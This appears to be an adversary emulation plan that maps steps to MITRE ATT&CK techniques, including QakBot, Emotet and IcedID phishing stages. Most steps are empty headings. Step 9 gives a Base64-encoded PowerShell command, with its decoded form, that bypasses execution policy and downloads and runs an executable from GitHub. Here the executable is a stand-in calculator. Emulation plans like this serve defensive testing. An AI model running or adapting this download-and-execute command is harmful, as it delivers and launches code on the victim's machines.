# Step 1 - Reconnaissance: n/a

Not covered

# Step 2 - Resource Development: T1608.006 Stage Capabilities: SEO Poisoning

Not covered but most software SEO-poisoned could be found here:
https://github.com/Sam0x90/CTI/blob/main/ATT%26CK/Techniques/T1608_Stage_Capabilities/T1608.006_SEO_Poisoning/SEO_poisoned_software.txt

# Step 3 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0650 QakBot



# Step 4 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0367 Emotet

# Step 5 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0483 IcedID

# Step 6 - Initial Access: T1566.001 Phishing: Spearphishing Attachment - S0367 Emotet

# Step 7 - Initial Access: T1566.002 Phishing: Spearphishing Link

# Step 8 - Execution: T1204.002 User Exectution: Malicious File

# Step 9 - Execution: T1059.001 Powershell
This LNK will run the following powershell command line:

```powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JAB1AHIAbAA9ACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBTAGEAbQAwAHgAOQAwAC8AQwBUAEkALwByAGEAdwAvAG0AYQBpAG4ALwBBAGQAdgBlAHIAcwBhAHIAeQAlADIAMABFAG0AdQBsAGEAdABpAG8AbgAlADIAMABQAGwAYQBuAHMALwAyADAAMgAyAF8AVABvAHAAMwA1AF8ATQBpAHQAcgBlAC8AYwBhAGwAYwAuAGUAeABlACIAOwAkAHAAYQB0AGgAPQAiAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAYwBhAGwAYwAuAGUAeABlACIAOwBpAHcAcgAgAC0AdQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABwAGEAdABoADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABwAGEAdABoAA==```

This is the decoded command: 

```$url="https://github.com/Sam0x90/CTI/raw/main/Adversary%20Emulation%20Plans/2022_Top35_Mitre/calc.exe";$path="C:\Users\Public\calc.exe";iwr -uri $url -OutFile $path;Start-Process -FilePath $path```

# Step 10 - Execution/Discover: T1059.001 Powershell & T1135 Network Share Discovery










